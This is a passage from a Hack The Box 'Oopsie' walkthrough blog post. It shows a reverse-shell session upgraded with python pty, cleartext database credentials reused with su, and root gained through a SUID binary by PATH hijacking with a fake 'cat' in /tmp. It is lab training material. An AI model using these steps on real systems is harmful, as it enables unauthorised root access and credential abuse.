</span></span><span class=line><span class=cl>Linux oopsie 4.15.0-76-generic <span class=c1>#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 10:31:34 up  1:53,  <span class=m>0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=s1>&#39;t access tty; job control turned off
</span></span></span><span class=line><span class=cl><span class=s1>$ which python
</span></span></span><span class=line><span class=cl><span class=s1>$ python -c &#39;</span>import pty<span class=p>;</span> pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>/bin/sh: 2: python: not found
</span></span></span><span class=line><span class=cl><span class=s1>$ which python3
</span></span></span><span class=line><span class=cl><span class=s1>/usr/bin/python3
</span></span></span><span class=line><span class=cl><span class=s1>$ python3 -c &#39;</span>import pty<span class=p>;</span> pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>TERM environment variable not set.
</span></span><span class=line><span class=cl>www-data@oopsie:/$ clear
</span></span><span class=line><span class=cl>clear
</span></span><span class=line><span class=cl>TERM environment variable not set.
</span></span><span class=line><span class=cl>www-data@oopsie:/$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>www-data@oopsie:/$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>+  Stopped                 nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@oopsie:/<span class=nv>$clear</span>
</span></span></code></pre></div><p>Looking around a bit, we find the <strong>user flag</strong> in <em>robert&rsquo;s</em> <strong>home directory</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/$ whoami
</span></span><span class=line><span class=cl>www-data
</span></span><span class=line><span class=cl>www-data@oopsie:/$ <span class=nb>pwd</span>
</span></span><span class=line><span class=cl>/
</span></span><span class=line><span class=cl>www-data@oopsie:/$ uname -a
</span></span><span class=line><span class=cl>Linux oopsie 4.15.0-76-generic <span class=c1>#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>www-data@oopsie:/$ ls -hla
</span></span><span class=line><span class=cl>total 100K
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>24</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>24</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>3</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> boot
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> cdrom
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>18</span> root root 3.9K May <span class=m>12</span> 08:37 dev
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>97</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> etc
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>3</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> home
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>33</span> Jan <span class=m>27</span>  <span class=m>2020</span> initrd.img -&gt; boot/initrd.img-4.15.0-76-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>33</span> Oct <span class=m>11</span>  <span class=m>2021</span> initrd.img.old -&gt; boot/initrd.img-4.15.0-76-generic
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>21</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> lib
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> lib64
</span></span><span class=line><span class=cl>drwx------   <span class=m>2</span> root root  16K Jan <span class=m>23</span>  <span class=m>2020</span> lost+found
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> media
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> mnt
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> opt
</span></span><span class=line><span class=cl>dr-xr-xr-x <span class=m>123</span> root root    <span class=m>0</span> May <span class=m>12</span> 08:37 proc
</span></span><span class=line><span class=cl>drwx------   <span class=m>6</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> root
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>27</span> root root  <span class=m>880</span> May <span class=m>12</span> 08:38 run
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  12K Jan <span class=m>27</span>  <span class=m>2020</span> sbin
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>4</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> snap
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Aug  <span class=m>5</span>  <span class=m>2019</span> srv
</span></span><span class=line><span class=cl>dr-xr-xr-x  <span class=m>13</span> root root    <span class=m>0</span> May <span class=m>12</span> 10:50 sys
</span></span><span class=line><span class=cl>drwxrwxrwt   <span class=m>2</span> root root 4.0K May <span class=m>12</span> 10:30 tmp
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>10</span> root root 4.0K Aug  <span class=m>5</span>  <span class=m>2019</span> usr
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>14</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> var
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>30</span> Jan <span class=m>27</span>  <span class=m>2020</span> vmlinuz -&gt; boot/vmlinuz-4.15.0-76-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>30</span> Oct <span class=m>11</span>  <span class=m>2021</span> vmlinuz.old -&gt; boot/vmlinuz-4.15.0-76-generic
</span></span><span class=line><span class=cl>www-data@oopsie:/$ <span class=nb>cd</span> home/
</span></span><span class=line><span class=cl>www-data@oopsie:/home$ ls -hla
</span></span><span class=line><span class=cl>total 12K
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root   root   4.0K Jul <span class=m>28</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root   root   4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> robert robert 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> robert
</span></span><span class=line><span class=cl>www-data@oopsie:/home$ <span class=nb>cd</span> robert/
</span></span><span class=line><span class=cl>www-data@oopsie:/home/robert$ ls -hla
</span></span><span class=line><span class=cl>total 28K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> robert robert 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root   root   4.0K Jul <span class=m>28</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> robert robert    <span class=m>9</span> Jan <span class=m>25</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> robert robert  <span class=m>220</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> robert robert 3.7K Apr  <span class=m>4</span>  <span class=m>2018</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> robert robert 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> .gnupg
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> robert robert  <span class=m>807</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .profile
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> robert robert   <span class=m>33</span> Feb <span class=m>25</span>  <span class=m>2020</span> user.txt
</span></span><span class=line><span class=cl>www-data@oopsie:/home/robert$
</span></span></code></pre></div><p>Notice the <em>r&ndash;</em> in the last <strong>permission column</strong>. Doesn&rsquo;t that mean that everybody can <strong>read</strong> it? How nice, let&rsquo;s <strong>grab</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/home/robert$ cat user.txt 
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>www-data@oopsie:/home/robert$
</span></span></code></pre></div><p>The question <strong>implies</strong> some interesting files containing some sensitive information. Let&rsquo;s look for them. One of places we definitely need to check out is the <strong>location</strong> where the web page is <strong>installed</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/var/www/html/cdn-cgi/login$ ls -hla
</span></span><span class=line><span class=cl>total 28K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root 4.0K Jul <span class=m>28</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root 6.3K Apr <span class=m>15</span>  <span class=m>2021</span> admin.php
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root   <span class=m>80</span> Jan <span class=m>24</span>  <span class=m>2020</span> db.php
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root 5.3K Apr <span class=m>15</span>  <span class=m>2021</span> index.php
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root    <span class=m>0</span> Jan <span class=m>24</span>  <span class=m>2020</span> script.js
</span></span><span class=line><span class=cl>www-data@oopsie:/var/www/html/cdn-cgi/login$
</span></span></code></pre></div><p>The question states that this password is <strong>shared</strong> with <em>robert</em>, so let&rsquo;s look for any mention of his name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * <span class=p>|</span> grep -i robert
</span></span><span class=line><span class=cl><span class=nv>$conn</span> <span class=o>=</span> mysqli_connect<span class=o>(</span><span class=s1>&#39;localhost&#39;</span>,<span class=s1>&#39;robert&#39;</span>,<span class=s1>&#39;M3g4C0rpUs3r!&#39;</span>,<span class=s1>&#39;garage&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>www-data@oopsie:/var/www/html/cdn-cgi/login$ 
</span></span></code></pre></div><p>There is <strong>one</strong>, but does it work?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>robert@oopsie:/var/www/html/cdn-cgi/login$
</span></span></code></pre></div><p>Yes, it <strong>worked</strong>. Now we have all the <strong>privileges</strong> that come with the <em>robert</em> <strong>user</strong>.</p><p>However, the question is only interested in the <strong>exact</strong> <strong>file</strong> name and not in the <strong>password</strong> itself. To get that, we need to make some readjustments to the previously used command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>robert@oopsie:/var/www/html/cdn-cgi/login$ grep -i robert *
</span></span><span class=line><span class=cl>db.php:<span class=nv>$conn</span> <span class=o>=</span> mysqli_connect<span class=o>(</span><span class=s1>&#39;localhost&#39;</span>,<span class=s1>&#39;robert&#39;</span>,<span class=s1>&#39;M3g4C0rpUs3r!&#39;</span>,<span class=s1>&#39;garage&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>robert@oopsie:/var/www/html/cdn-cgi/login$
</span></span></code></pre></div><blockquote><p>db.php</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?</em></p><p>At first, using <em><strong>find</strong></em> and making sure to <strong>discard</strong> the error messages (<em>2>/dev/null</em>) returns nothing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/home/robert$ find / -group bugtracker -executable 2&gt;/dev/null
</span></span></code></pre></div><p>Could it be, that the file we are looking for is only <strong>executable</strong> by a certain group?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/home/robert$ find / -group bugtracker 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/bin/bugtracker
</span></span><span class=line><span class=cl>www-data@oopsie:/home/robert$
</span></span></code></pre></div><p>It certanly looks like it.</p><blockquote><p>find</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@oopsie:/home/robert$ ls -hla /usr/bin/bugtracker
</span></span><span class=line><span class=cl>-rwsr-xr-- <span class=m>1</span> root bugtracker 8.6K Jan <span class=m>25</span>  <span class=m>2020</span> /usr/bin/bugtracker
</span></span><span class=line><span class=cl>www-data@oopsie:/home/robert$
</span></span></code></pre></div><p>Looking at it, the executable has it&rsquo;s <strong>suid</strong> bit set. So once run, it will run with <strong>root</strong> privileges (root is the owner).</p><blockquote><p>root</p></blockquote><h2 id=task-9><strong>TASK 9</strong><a hidden class=anchor aria-hidden=true href=#task-9>#</a></h2><p><strong>Question</strong>: <em>What SUID stands for?</em></p><p>A simple <strong>online search</strong> should help us out here.</p><blockquote><p>set owner user id</p></blockquote><h2 id=task-10><strong>TASK 10</strong><a hidden class=anchor aria-hidden=true href=#task-10>#</a></h2><p><strong>Question</strong>: <em>What is the name of the executable being called in an insecure manner?</em></p><p><strong>Running</strong> the <strong>executable</strong> we found in TASK7 <strong>without any parameters</strong> provides us with some <strong>hints</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>robert@oopsie:/$ ./usr/bin/bugtracker
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------------------
</span></span><span class=line><span class=cl>: EV Bug Tracker :
</span></span><span class=line><span class=cl>------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provide Bug ID: <span class=m>42</span>
</span></span><span class=line><span class=cl>---------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat: /root/reports/42: No such file or directory
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>robert@oopsie:/$ 
</span></span></code></pre></div><p>Like the one, that it&rsquo;s using <em><strong>cat</strong></em> to access a non-existent file at - <em>/root/reports/42</em> -. Or that <em><strong>cat</strong></em> is called <strong>without</strong> it&rsquo;s <strong>full path</strong> being specified and <strong>NOT</strong> with <em>/bin/cat</em> (like it should be).</p><blockquote><p>cat</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>We already <strong>grabbed</strong> it in TASK6.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>We continue where we left off (after TASK10).</p><p>Our <strong>idea</strong> is to <strong>hijack</strong> the <strong>path</strong> that our system searches for when it looks for the <em><strong>cat&rsquo;s</strong></em> binary/installation. So <strong>overwriting</strong> this location and <strong>implementing</strong> our <strong>own version</strong> of the <em><strong>cat</strong></em> command would result in our <strong>own version executing</strong> when the <em>bugtracker</em> binary is run.</p><p>Therefore, we <strong>create</strong> our <strong>own version</strong> and save it in the <em>/tmp</em> directory (directory clears at reboot). Moreover, we make sure to <strong>assign</strong> everybody <strong>execute permissions</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>robert@oopsie:/$ <span class=nb>cd</span> /tmp/
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ which bash
</span></span><span class=line><span class=cl>/bin/bash
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ <span class=nb>echo</span> <span class=s2>&#34;/bin/bash&#34;</span> &gt; cat
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ ls -hla
</span></span><span class=line><span class=cl>total 12K
</span></span><span class=line><span class=cl>drwxrwxrwt  <span class=m>2</span> root   root   4.0K May <span class=m>12</span> 12:18 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root   root   4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> robert robert   <span class=m>10</span> May <span class=m>12</span> 12:18 cat
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ chmod a+x cat 
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ ls -hla
</span></span><span class=line><span class=cl>total 12K
</span></span><span class=line><span class=cl>drwxrwxrwt  <span class=m>2</span> root   root   4.0K May <span class=m>12</span> 12:18 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root   root   4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>-rwxrwxr-x  <span class=m>1</span> robert robert   <span class=m>10</span> May <span class=m>12</span> 12:18 cat
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$
</span></span></code></pre></div><p>All that&rsquo;s left now is to <strong>overwrite</strong> the <strong>location</strong> which the system uses to <strong>search</strong> for the <strong>binaries</strong>. It can be done via <strong>environmental variables</strong> - quite similar to what we use to specify our <em>rhost</em> variable. Only, this one actually <strong>does</strong> <strong>persist</strong> throughout multiple <strong>shells</strong> since it&rsquo;s an <strong>environmental variable</strong>, instead of a <strong>local</strong> one.</p><p>Moreover, this time we do NOT want to add anything new. We only want to <strong>prepend</strong> our <strong>location</strong> to the other <strong>locations</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>robert@oopsie:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp:<span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ <span class=nb>echo</span> <span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</span></span><span class=line><span class=cl>robert@oopsie:/tmp$ 
</span></span></code></pre></div><p>Finally, <strong>running</strong> the <em>bugtracker</em> binary after everything is set up will welcome us with a <strong>root</strong> shell. And since we already know where the <strong>root flag</strong> is, we simply <strong>grab it</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>robert@oopsie:/tmp$ /usr/bin/bugtracker
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------------------
</span></span><span class=line><span class=cl>: EV Bug Tracker :
</span></span><span class=line><span class=cl>------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provide Bug ID: <span class=m>42</span>
</span></span><span class=line><span class=cl>---------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@oopsie:/tmp# whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>root@oopsie:/tmp# cat /root/root.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>root@oopsie:/tmp# 
</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/oopsie/>oopsie</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/free-tier/>free-tier</a></li><li><a href=https://bluewalle.github.io/tags/php/>php</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/session-handling/>session-handling</a></li><li><a href=https://bluewalle.github.io/tags/apache/>apache</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/web-site-structure-discovery/>web-site-structure-discovery</a></li><li><a href=https://bluewalle.github.io/tags/cookie-manipulation/>cookie-manipulation</a></li><li><a href=https://bluewalle.github.io/tags/suid-exploitation/>suid-exploitation</a></li><li><a href=https://bluewalle.github.io/tags/authentication-bypass/>authentication-bypass</a></li><li><a href=https://bluewalle.github.io/tags/clear-text-credentials/>clear-text-credentials</a></li><li><a href=https://bluewalle.github.io/tags/arbitrary-file-upload/>arbitrary-file-upload</a></li><li><a href=https://bluewalle.github.io/tags/insecure-direct-object-reference/>insecure-direct-object-reference</a></li><li><a href=https://bluewalle.github.io/tags/idor/>idor</a></li><li><a href=https://bluewalle.github.io/tags/path-hijacking/>path-hijacking</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>